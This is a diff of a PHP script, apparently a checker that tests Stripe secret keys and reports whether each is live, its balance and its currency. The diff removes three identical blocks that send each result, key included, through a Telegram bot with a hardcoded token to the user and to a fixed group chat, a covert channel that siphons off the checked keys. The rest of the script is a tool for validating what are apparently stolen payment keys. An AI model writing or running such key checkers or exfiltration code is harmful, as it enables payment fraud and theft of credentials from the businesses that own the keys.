@@ -56,11 +56,6 @@ if ((strpos($r1, 'rate_limit')) || (strpos($r1, 'rate_limit'))){
 RESPONSE : RATE LIMIT ⚠️
 BALANCE : $balance 
 CURRENCY : $curr";
-  $apiToken = '5119865265:AAFJ6gZ8Bj7XzuwrW53E_KpwCT_6K94G4TY';
-  $forward1 = ['chat_id' => $tg_id,'text' => $tg2,'parse_mode' => 'HTML' ];
-  $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
-  $forward2 = ['chat_id' => '-840687399','text' => $tg2,'parse_mode' => 'HTML' ];
-  $response2 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward2) );
 }
   elseif ((strpos($r1, 'tok_')) || (strpos($r1, 'tok'))){
     echo "<b>#LIVE : $sk
@@ -73,11 +68,6 @@ CURRENCY : $curr";
 RESPONSE : VALID LIVE SK KEY ✅
 BALANCE : $balance
 CURRENCY : $curr";
-  $apiToken = '5119865265:AAFJ6gZ8Bj7XzuwrW53E_KpwCT_6K94G4TY';
-  $forward1 = ['chat_id' => $tg_id,'text' => $tg2,'parse_mode' => 'HTML' ];
-  $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
-  $forward2 = ['chat_id' => '-840687399','text' => $tg2,'parse_mode' => 'HTML' ];
-  $response2 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward2) );
 }      
 elseif(strpos($r1, "api_key_expired" )) {
   echo "<b>DEAD : $sk
@@ -102,11 +92,6 @@ elseif(strpos($r1, "Your card was declined" )) {
 RESPONSE : VALID LIVE SK KEY ✅
 BALANCE : $balance
 CURRENCY : $curr";
-  $apiToken = '5119865265:AAFJ6gZ8Bj7XzuwrW53E_KpwCT_6K94G4TY';
-  $forward1 = ['chat_id' => $tg_id,'text' => $tg2,'parse_mode' => 'HTML' ];
-  $response1 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward1) );
-  $forward2 = ['chat_id' => '-840687399','text' => $tg2,'parse_mode' => 'HTML' ];
-  $response2 = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($forward2) );
 }
 else {
 echo "<b>DEAD: $sk
